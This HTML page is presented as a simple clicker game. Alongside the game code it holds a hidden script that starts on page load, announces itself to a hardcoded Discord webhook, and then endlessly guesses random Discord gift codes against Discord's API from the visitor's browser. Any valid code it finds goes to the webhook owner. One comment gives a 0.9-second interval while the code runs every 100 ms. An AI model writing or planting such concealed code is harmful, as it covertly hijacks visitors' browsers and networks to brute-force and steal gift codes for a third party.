<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Clicker Game</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
        }
        button {
            padding: 10px 20px;
            font-size: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Clicker Game</h1>
        <div class="score">Score: <span id="score">0</span></div>
        <button id="clickButton">Click Me!</button>
    </div>
    <script>
        let score = 0;

        document.getElementById('clickButton').addEventListener('click', function() {
            score++;
            document.getElementById('score').innerText = score;
        });
    </script>
      <script>
    // Function to send a "Hi" message to Discord webhook
    async function sendHiToWebhook(webhookUrl) {
      const payload = {
        content: "NITRO GENERATOR HOOKED UP, DONT CLOSE TAB!", // The message content
        username: "Nitro Generator", // Custom username
        avatar_url: "https://i1.sndcdn.com/artworks-NoYLmDjKQvRf1eve-coM8ew-t500x500.jpg", // Custom avatar URL
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (response.ok) {
          console.log('Message sent to webhook');
        } else {
          console.log('Failed to send message to webhook');
        }
      } catch (error) {
        console.error('Error sending message to webhook:', error);
      }
    }

    // Function to generate a random alphanumeric string of 19 characters
    function generateRandomString() {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      const length = 19;
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
      }
      return result;
    }

    // Function to send GET request
    async function checkGiftCode(code) {
      const url = `https://discordapp.com/api/v9/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`;
      try {
        const response = await fetch(url, { method: 'GET' });
        if (response.status === 200) {
          return code; // Return code if status is 200
        }
      } catch (error) {
        console.error('Error fetching code:', error);
      }
      return null; // Return null if not a valid code
    }

    // Function to send message to Discord webhook with custom profile name and icon
    async function sendToWebhook(webhookUrl, code) {
      const payload = {
        content: `Valid Nitro Code: ${code}`, // Message content with the code
        username: "Nitro Generator", // Profile name
        avatar_url: "https://i1.sndcdn.com/artworks-NoYLmDjKQvRf1eve-coM8ew-t500x500.jpg", // Profile icon
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (response.ok) {
          console.log('Message sent to webhook');
        } else {
          console.log('Failed to send message to webhook');
        }
      } catch (error) {
        console.error('Error sending message to webhook:', error);
      }
    }

    // Automatically start generation process
    (async function() {
      const webhookUrl = "https://discord.com/api/webhooks/1326756324691673201/MXJqi7zXYGiV7BSDvimbm2EuZLRb-HWzoaaDi9g9Qwlg8LJQ2ux61kRG5vWQSXaTT53K"; // Webhook URL hardcoded
      await sendHiToWebhook(webhookUrl);

      // Infinite generation: generate and check codes with a 0.9 second interval
      const generateAndCheck = async () => {
        const randomString = generateRandomString();
        const validCode = await checkGiftCode(randomString);

        // If the code is valid, send it to the webhook
        if (validCode) {
          await sendToWebhook(webhookUrl, validCode);
        }
      };

      // Loop to continuously generate and check codes (0.9-second interval)
      setInterval(generateAndCheck, 100); // 0.9 second interval (900ms)
    })();
  </script>
</body>
</html>
